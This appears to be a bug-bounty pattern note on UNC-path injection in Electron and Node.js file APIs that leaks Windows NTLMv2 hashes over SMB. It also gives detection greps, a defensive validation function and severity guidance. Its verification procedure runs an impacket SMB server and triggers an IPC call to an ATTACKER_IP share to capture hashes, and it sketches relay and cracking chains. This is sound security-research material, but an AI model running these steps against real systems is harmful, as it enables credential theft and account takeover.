---
type: pattern
title: Pattern - JWT File-based Validation UNC NTLM Oracle
tags: [pattern, cwe-918, cwe-200, ntlm, smb, windows, electron, nodejs, ssrf, bb-pattern]
status: verified
vuln_class: ssrf
severity_range: P2-P3
seen_in: [electron-desktop-app, nodejs-ipc-handler]
last_updated: 2026-04-25
---

# Pattern - JWT File-based Validation UNC NTLM Oracle

## TL;DR

Any Node.js / Electron / .NET API that accepts an attacker-controlled **file path** and passes it to a filesystem primitive (`fs.readFile`, `fs.access`, `fs.stat`, `File.ReadAllBytes`, etc.) is an outbound SMB NTLM oracle on Windows. Supply a UNC path (`\\attacker\share\probe.txt`) and Windows will automatically authenticate outbound via NTLMv2 before the file content is ever read.

**Not RCE on its own** — but yields:

1. **NTLMv2 hash exfiltration** → offline Hashcat cracking or Pass-the-Hash relay
2. **File existence / timing oracle** → directory enumeration, config file discovery
3. **Content read** (for `readFile` variants) → DoS on large files or data exfil from attacker-owned share

The JWT validation case is one instance. The broader pattern covers any "load file from configurable path" operation: log configs, certificate paths, plugin modules, theme files, or any "path" parameter accepted over IPC.

## Root-cause ingredients

### Ingredient 1: `fs.readFile` in an IPC handler (canonical case)

```javascript
// JWT validation reads token content from a file path supplied by caller
async function checkJsonWebTokenByFileAsync(jwtFilePath) {
  // ❌ no path validation — jwtFilePath can be \\attacker\share\token.jwt
  const tokenContent = await vd.readFile(jwtFilePath);
  return jwt.verify(tokenContent, publicKey);
}

ipcMain.handle("auth:verifyTokenFile", (event, { jwtFilePath }) => {
  return checkJsonWebTokenByFileAsync(jwtFilePath);
});
```

### Ingredient 2: `fs.access` / `fs.stat` — same SMB primitive, no content needed

```javascript
// "Does this config file exist?" — triggers NTLMv2 auth even without reading
ipcMain.handle("config:exists", (event, { configPath }) => {
  // ❌ configPath = \\attacker\share\probe → SMB auth outbound
  return fs.promises.access(configPath, fs.constants.F_OK)
    .then(() => true).catch(() => false);
});
```

### Ingredient 3: `require(modulePath)` — SMB-fetched JS eval (RCE if reached)

```javascript
// Dynamic plugin loading — if attacker controls modulePath, content is eval'd
ipcMain.handle("plugin:load", (event, { modulePath }) => {
  // ❌ require("\\\\attacker\\share\\evil.js") → fetch + eval from SMB share
  return require(modulePath);
});
```

### Ingredient 4: Certificate / log / config "load from file" — same sink

```javascript
// Any "load from path" operation is the same primitive
ipcMain.handle("tls:loadCert", (event, { certPath }) => {
  // ❌ certPath can be UNC → NTLM auth before TLS read
  return fs.promises.readFile(certPath);
});
```

**The common factor**: Windows `CreateFile()` resolves UNC paths via SMB and triggers NTLM authentication transparently, before any application-layer logic runs.

## Detection methodology

1. **Grep IPC handlers for FS primitives**:
   ```bash
   grep -rn "fs\.readFile\|fs\.access\|fs\.stat\|fs\.createReadStream\|readFileSync\|accessSync" \
     --include="*.js" app/
   ```

2. **Check for `require` with dynamic path**:
   ```bash
   grep -rn "require(" app/ | grep -v "require('" | grep -v 'require("'
   # flag any require(variable) pattern
   ```

3. **Verify path normalization is absent**: trace `attackerInput → fs.X(...)`. If no `path.normalize`, `path.resolve`, or scheme restriction between them = vulnerable.

4. **Check `senderFrame.url` validation**: is the IPC handler gated on trusted sender origin?
   ```javascript
   // Safe pattern
   if (!event.senderFrame.url.startsWith("https://app.example.com/")) return;
   ```

5. **Check UNC rejection**: does any code explicitly reject `\\` prefix or `//` or UNC-like patterns?
   ```javascript
   // Safe gate
   if (inputPath.startsWith("\\\\") || inputPath.startsWith("//")) throw new Error("UNC rejected");
   ```

6. **Pure static analysis sufficiency**: `attackerInput → fs.X(path)` with no normalization in between = vulnerable. No runtime needed to confirm SMB auth will fire.

## Live verification SOP

```bash
# 1. Attacker host — start impacket SMB server
mkdir -p /tmp/smb_share
echo "probe" > /tmp/smb_share/probe.txt
sudo impacket-smbserver SHARE /tmp/smb_share -smb2support

# 2. Trigger the vulnerable IPC from Electron renderer
# (via DevTools Console or crafted IPC call)
await window.electronAPI.verifyTokenFile({ jwtFilePath: "\\\\ATTACKER_IP\\SHARE\\probe.txt" });

# 3. Observe attacker host stdout — SMB connection log:
# [*] Incoming connection (VICTIM_IP, 49XXX)
# [*] AUTHENTICATE_MESSAGE (WINDOWS\test, ...)
# [*] User WINDOWS\test authenticated successfully
# [*] Connecting Share(1:IPC$)
# [*] Connecting Share(2:SHARE)
# NTLMv2 Hash:  test::WINDOWS:aad3b435...:...:<full NTLMv2 hash>

# 4. File existence oracle test
# Real file  → SMB auth fires + application returns content/true
# Fake file  → SMB auth fires + application returns ENOENT / false
# Timing delta distinguishes "file found on share" vs "not found"
```

**Expected attacker-host output for confirmed capture**:
```
[*] Connecting Share(1:IPC$)
[*] User WINDOWS\test authenticated successfully
NTLMv2: test::WINDOWS:aad3...:<hash>
```

If you see `[*] Incoming connection` but no `authenticated successfully` — SMB2 signing may be enforced; try `-smb2support` flag or switch to Responder.

## Variants

| ID | Sink | Content Read? | NTLM Auth? | Notes |
|----|------|--------------|------------|-------|
| A | `fs.readFile(uncPath)` | Yes | Yes | Canonical case; DoS risk on large files |
| B | `fs.access(uncPath)` / `fs.stat(uncPath)` | No | Yes | Lighter footprint; pure oracle |
| C | `require(uncPath)` | Yes + eval | Yes | **RCE if reached** — SMB-fetched JS is executed |
| D | .NET `File.ReadAllBytes(path)` | Yes | Yes | CefSharp-embedded apps; same Win32 primitive |
| E | `LoadLibrary(uncPath)` (native addon) | No | Yes | DLL hijack from SMB share → native code exec |
| F | macOS `NSFileManager` / `open(smb://...)` | Depends | SMB with dialog | macOS requires user auth dialog; less exploitable unattended |

Variant C is the only one that crosses into RCE territory — prioritize detection of dynamic `require`.

## Real-world examples

| Vendor / App | Variant | Sink | Status |
|---|---|---|---|
| Desktop messenger app (Electron) | A | `checkJsonWebTokenByFileAsync → vd.readFile(jwtFilePath)` | Source-confirmed (static analysis) |
| Companion desktop app (CefSharp) | D | CefSharp `File.ReadAllBytes(uri.AbsolutePath)` | Source-confirmed |
| Slack (multiple versions) | A/B | Electron IPC file path args | Reported by researchers via HackerOne; no public CVE |
| Discord | A | CVE-2024-27288-related surface, Electron IPC with path param | Patched 2024 |
| VSCode (historical) | B | Extension API path traversal, `vscode.workspace.fs.stat(uri)` | Reported via MSRC |

## Defense

```javascript
const path = require("path");

function validateFilePath(inputPath, allowedBase) {
  // 1. Reject UNC paths (\\server\share or //server/share)
  if (/^(\\\\|\/\/)/.test(inputPath)) {
    throw new Error("UNC paths not allowed");
  }

  // 2. Reject non-file URI schemes
  if (/^[a-zA-Z][a-zA-Z0-9+\-.]*:/.test(inputPath) && !inputPath.startsWith("file://")) {
    throw new Error("Only file paths allowed");
  }

  // 3. Canonicalize to absolute path
  const resolved = path.resolve(inputPath);

  // 4. Restrict to allowed base directory
  if (!resolved.startsWith(path.resolve(allowedBase))) {
    throw new Error("Path outside allowed directory");
  }

  return resolved;
}

// IPC handler — safe pattern
ipcMain.handle("auth:verifyTokenFile", (event, { jwtFilePath }) => {
  // Gate on trusted sender
  if (!event.senderFrame.url.startsWith("app://main/")) return;
  // Validate path before any FS operation
  const safePath = validateFilePath(jwtFilePath, app.getPath("userData"));
  return checkJsonWebTokenByFileAsync(safePath);
});
```

**Additional hardening**:
- Use `contextIsolation: true` + `contextBridge` to restrict which FS operations are exposed at all
- Prefer loading JWT from in-memory config (not file path) — eliminate the "path as parameter" design entirely
- On Windows, consider enabling SMB signing on corp endpoints to block relay even if UNC reaches the wire

## Filing & severity

- **Solo CVSS**: ~6.0 Medium (`AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N`) — info disclosure + NTLMv2 capture
- **NOT RCE on its own** — do not frame as RCE; triagers will downgrade and lose trust in the report
- **Honest impact framing**:
  - Verified: "outbound NTLMv2 hash exfiltration enabling offline cracking or NTLM relay attacks"
  - Verified: "file existence oracle enabling directory enumeration"
  - Potential (requires additional conditions): "Pass-the-Hash relay to corp SMB/LDAP/HTTP → ATO of Windows account"
  - Not verified unless Variant C: "remote code execution"
- **macOS / Linux**: not applicable — `fs.readFile` on `\\path` on macOS/Linux is treated as a relative path from root, not an SMB primitive. Clearly scope the finding to Windows.
- **Combined with `shell.openExternal(UNC)`**: filing both findings as an "outbound SMB NTLM exposure cluster" (same primitive, multiple independent sinks) raises aggregate severity and demonstrates systemic input validation failure.

## Chains

```
Attacker-controlled jwtFilePath
  → fs.readFile("\\\\ATTACKER_IP\\SHARE\\token.jwt")
  → Windows SMB auth → NTLMv2 hash captured

NTLMv2 hash
  → Path A: Hashcat offline crack (consumer GPU, common passwords ~hours) → plaintext password
  → Path B: ntlmrelayx relay to corp SMB / LDAP / HTTP endpoint → ATO of Windows account
             → if admin account → lateral movement → RCE on corp infra

File existence oracle
  → enumerate config file paths ("C:\Users\victim\AppData\...\config.json")
  → confirm presence → feed into separate read primitive or social engineering
```

**Combined with `shell.openExternal(UNC)` pattern**:
- Multiple independent sinks in the same app family share the same underlying primitive (Windows NTLM outbound auth)
- Filing together as "multiple unvalidated FS sinks with outbound SMB exposure" → demonstrates systemic CWE-20 → supports higher aggregate severity
- If one sink yields NTLM hash and other yields code exec, combined CVSS approaches P2

## Related

- [[Pattern - Windows UNC Path Primitive]] — meta-pattern: this pattern's sink type shares an OS-level primitive with sibling sink types
- [[Pattern - Electron will-download Path Traversal]] — sibling sink sharing the same OS primitive, write direction
